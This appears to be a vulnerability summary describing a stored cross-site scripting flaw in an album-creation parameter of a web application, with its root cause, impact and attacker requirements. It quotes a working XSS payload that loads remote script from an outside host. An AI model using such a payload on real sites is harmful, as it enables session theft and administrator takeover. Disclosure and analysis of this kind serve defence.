- **Root cause of vulnerability:** The application fails to sanitize user-supplied input for the "album_name" POST parameter in the `/index.php/album/add` path, leading to a stored XSS vulnerability.
- **Weaknesses/vulnerabilities present:** Stored Cross-Site Scripting (XSS).
- **Impact of exploitation:**
    - Arbitrary JavaScript code execution.
    - Potential for stealing administrator cookies and gaining administrator privileges.
    - Introduction of hooks using tools like Beef framework.
- **Attack vectors:** A malicious user can inject XSS payloads, such as `<svg/onload=$.getScript("http://gp.io:81");>`, into the `album_name` parameter when creating or modifying an album. This payload is then stored by the application. When another user (including the administrator) views the page with the stored XSS, the injected code will execute in their browser session.
- **Required attacker capabilities/position:**
    - An attacker needs to be a common user with the ability to add an album.
    - They do not need to be an administrator to inject the XSS payload.
    - The XSS is triggered when an administrator (or another user) views the album listing page.
